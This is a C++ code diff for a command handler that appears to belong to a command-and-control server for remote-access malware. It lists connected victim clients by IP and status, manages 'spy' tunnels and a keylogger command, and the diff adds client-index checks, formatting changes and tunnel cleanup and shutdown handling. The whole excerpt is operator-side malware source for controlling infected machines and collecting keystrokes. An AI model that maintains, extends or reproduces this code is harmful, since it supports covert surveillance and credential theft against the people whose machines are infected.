@@ -221,6 +221,13 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
             *p_event_log_ << LOG_MUST << RED << "Either -i or -a argument is required" << RESET_C2_FIFO;
             return -1;
         }
+        if (index_found && !all_found) {
+            int index_value = std::any_cast<int>(temp_arg_map[INDEX_ARG]);
+            if (index_value < 0 || index_value >= p_clients_->size()) {
+                *p_event_log_ << LOG_MUST << RED << "Invalid client index: " << index_value << RESET_C2_FIFO;
+                return -1;
+            }
+        }
     }
 
     for (int required_arg : command.required_) {
@@ -315,14 +322,14 @@ void CommandHandler::list() {
     *p_event_log_ << LOG_MUST << CYAN << "[Available Clients]";
     for (int i=0; i<p_clients_->size(); i++) {
         if (p_clients_->at(i) != nullptr) {
-            *p_event_log_ << "\n==Client " << i << "==    " << p_clients_->at(i)->ip();
+            *p_event_log_ << "\n\n==Client " << i << "==    " << p_clients_->at(i)->ip();
             *p_event_log_ << "\nStatus: ";
             if (ClientHandler::is_client_up(p_clients_->at(i)->socket()) == 0) {
                 *p_event_log_ << GREEN << "UP\033[0m";
             } else {
                 *p_event_log_ << RED << "DOWN\033[0m";
             }
-            *p_event_log_ << "\nTunnels:";
+            *p_event_log_ << CYAN << "\nTunnels:\n";
             for (auto it=p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
                 if ((*it)->client_index_ == i) {
                     if ((*it)->command_code_ == KEYLOGGER) {
@@ -405,16 +412,23 @@ void CommandHandler::keylogger() {
 
 void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel) {
     if (__p_tunnel->p_spy_tunnel_->init(*p_ip_, port_, __p_tunnel->p_tunnel_shutdown_fd_, TCP_BASED) == 0) {
+        Tunnel::active_tunnels_++;
         __p_tunnel->p_spy_tunnel_->run();
     }
 
     // If we reach here, the tunnel has finished (due to error or completion) and ready to be cleaned up
     {
         std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
-        tunnel_context_->tunnel_queue_.push(__p_tunnel);
-        tunnel_context_->tunnel_cv_.notify_one();
-        return;
+        erase_tunnel(p_tunnels_, __p_tunnel->client_index_, __p_tunnel->command_code_);
+        Tunnel::active_tunnels_--;
+        std::cout << MAGENTA << "[CommandHandler::handle_tunnelt] helper thread finished" << RESET;
+        if (p_shutdown_flag_->load() && Tunnel::active_tunnels_ == 0) {
+            std::cout << MAGENTA << "[CommandHandler::handle_tunnelt] All tunnels finished, shutting down" << RESET;
+            tunnel_context_->all_processed_cv_.notify_all();
+        }
     }
+    return;
+    
 }
 
 Tunnel* CommandHandler::get_tunnel(int __client_index, CommandCode __command_code) {
